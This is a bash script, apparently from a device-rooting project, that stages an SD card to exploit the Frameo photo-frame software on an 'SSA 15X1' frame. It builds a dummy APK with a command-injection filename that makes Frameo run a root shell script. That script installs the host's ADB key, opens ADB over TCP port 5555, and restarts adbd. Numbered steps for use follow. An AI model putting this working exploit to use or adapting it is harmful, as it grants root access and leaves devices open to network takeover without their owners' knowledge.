#!/usr/bin/env bash
set -euo pipefail

# prepare-sd.sh — Stage SSA 15X1 SD-card files into a directory.
#
# Builds a dummy APK with a command-injection filename that triggers
# Frameo's AManufacturerUtilities to run a root shell script.
# The script writes the host's ADB public key and enables TCP ADB.
#
# Requirements: Android SDK (aapt2, apksigner from build-tools; android.jar
# from platforms), Java keytool, and ~/.android/adbkey.pub.
#
# Usage:
#   bash prepare-sd.sh [output-dir]
#
# Then copy output-dir/* to a FAT32 SD card. On macOS use cp -RX to avoid
# AppleDouble files, or run dot_clean -m on the card after copying.

# --- Locate Android SDK ---
SDK="${ANDROID_HOME:-${ANDROID_SDK_ROOT:-$HOME/Library/Android/sdk}}"
if [[ ! -d "$SDK" ]]; then
  echo "Android SDK not found at $SDK"
  echo "Set ANDROID_HOME or ANDROID_SDK_ROOT"
  exit 1
fi

# Find the newest build-tools
BT_DIR=$(ls -1d "$SDK/build-tools"/*/ 2>/dev/null | sort -V | tail -1)
[[ -z "$BT_DIR" ]] && { echo "No build-tools found in $SDK"; exit 1; }

# Find the newest platform
PLATFORM_DIR=$(ls -1d "$SDK/platforms"/android-*/ 2>/dev/null | sort -V | tail -1)
[[ -z "$PLATFORM_DIR" ]] && { echo "No platform found in $SDK"; exit 1; }

AAPT2="$BT_DIR/aapt2"
APKSIGNER="$BT_DIR/apksigner"
ANDROID_JAR="$PLATFORM_DIR/android.jar"

# ADB public key
KEYFILE="$HOME/.android/adbkey.pub"
[[ -f "$KEYFILE" ]] || { echo "Missing $KEYFILE — run 'adb keygen' first"; exit 1; }
PUBKEY=$(awk '{print $1}' "$KEYFILE")

# The SSA 15X1 ships Frameo v1.27.4 (54790) — need higher
VERSION_CODE="${VERSION_CODE:-99999}"
OUT="${1:-./sd-card}"

# The APK filename with command injection
APK_NAME="x';sh\${IFS}\$(find\${IFS}\${ANDROID_DATA%data}storage\${IFS}-maxdepth\${IFS}2\${IFS}-name\${IFS}p_frameo_jb);#.apk"

echo "=== SD Card Prep for SSA 15X1 ==="
echo "Output: $OUT"
echo "SDK:    $SDK"
echo "Build:  $BT_DIR"
echo ""

# Check tools
for tool in "$AAPT2" "$APKSIGNER"; do
  [[ -f "$tool" ]] || { echo "Missing: $tool"; exit 1; }
done
[[ -f "$ANDROID_JAR" ]] || { echo "Missing: $ANDROID_JAR"; exit 1; }

# Create output structure
rm -rf "$OUT"
mkdir -p "$OUT/Frameo_utilities"

# --- Build dummy APK ---
echo "Building dummy APK (versionCode=$VERSION_CODE)..."
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

# AndroidManifest.xml
cat > "$TMPDIR/AndroidManifest.xml" << MANIFEST
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="net.frameo.frame"
    android:versionCode="$VERSION_CODE"
    android:versionName="ssa-15x1-sd-$VERSION_CODE">
    <uses-sdk android:minSdkVersion="23" android:targetSdkVersion="23" />
    <application android:label="SD utility" android:hasCode="false"
        android:allowBackup="false" />
</manifest>
MANIFEST

# Compile and link with aapt2
"$AAPT2" compile --dir "$TMPDIR" -o "$TMPDIR/res.zip" 2>/dev/null || true
"$AAPT2" link --manifest "$TMPDIR/AndroidManifest.xml" \
  -I "$ANDROID_JAR" \
  -o "$TMPDIR/unsigned.apk" \
  --min-sdk-version 23 --target-sdk-version 23 \
  --version-code "$VERSION_CODE" --version-name "ssa-15x1-sd-$VERSION_CODE" 2>&1

# Sign with a disposable key
KEYSTORE="$TMPDIR/debug.jks"
keytool -genkeypair -v -keystore "$KEYSTORE" -storepass android \
  -keypass android -keyalg RSA -keysize 2048 -validity 1 \
  -alias key -dname "CN=SD,O=tmp" 2>/dev/null

"$APKSIGNER" sign --ks "$KEYSTORE" --ks-pass pass:android \
  --key-pass pass:android --ks-key-alias key \
  --out "$TMPDIR/signed.apk" "$TMPDIR/unsigned.apk" 2>&1

# Copy APK with the injection filename
cp "$TMPDIR/signed.apk" "$OUT/Frameo_utilities/$APK_NAME"
echo "  APK created"

# --- Config file ---
printf 'auto_run=action_update_version\n' > "$OUT/Frameo_utilities/frameo_utilities.config"
echo "  Config written"

# --- p_frameo_jb script ---
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ENABLE_SRC="$SCRIPT_DIR/enable-adb.sh"

if [[ -f "$ENABLE_SRC" ]]; then
  sed "s|__PUBKEY__|$PUBKEY|g" "$ENABLE_SRC" > "$OUT/p_frameo_jb"
else
  # Inline fallback if enable-adb.sh is not alongside this script
  cat > "$OUT/p_frameo_jb" << SCRIPT
#!/system/bin/sh
set -u
card=\$(dirname "\$0")
log="\$card/adb-result.txt"
exec > "\$log" 2>&1
date
id
echo "fingerprint=\$(getprop ro.build.fingerprint)"
rm -f "\$card/Frameo_utilities/frameo_utilities.config" 2>/dev/null
keys=/data/misc/adb/adb_keys
mkdir -p /data/misc/adb
printf '%s\n' '$PUBKEY' > "\$keys"
chown 1000:2000 "\$keys"
chmod 640 "\$keys"
chcon u:object_r:adb_keys_file:s0 "\$keys" 2>/dev/null || true
setprop service.adb.tcp.port 5555
setprop persist.adb.tcp.port 5555
setprop persist.internet_adb_enable 1
stop adbd
sleep 1
start adbd
echo "ADB key written, TCP 5555 enabled"
echo "done"
SCRIPT
fi

chmod +x "$OUT/p_frameo_jb"
echo "  Script written"

echo ""
echo "=== Card contents ==="
find "$OUT" -type f | sort | while read f; do
  echo "  $f"
done

echo ""
echo "=== Next steps ==="
echo "1. Format an SD card as FAT32 (MBR)"
echo "2. Copy everything from $OUT/ to the root of the card"
echo "   macOS: cp -RX $OUT/* /Volumes/YOUR_CARD/"
echo "          dot_clean -m /Volumes/YOUR_CARD"
echo "3. Boot the frame, wait for Frameo to fully load"
echo "4. Insert the SD card"
echo "5. Wait ~30 seconds for 'Successfully installed APK'"
echo "6. Click COMPLETE TASK"
echo "7. Then: adb connect <frame-ip>:5555"
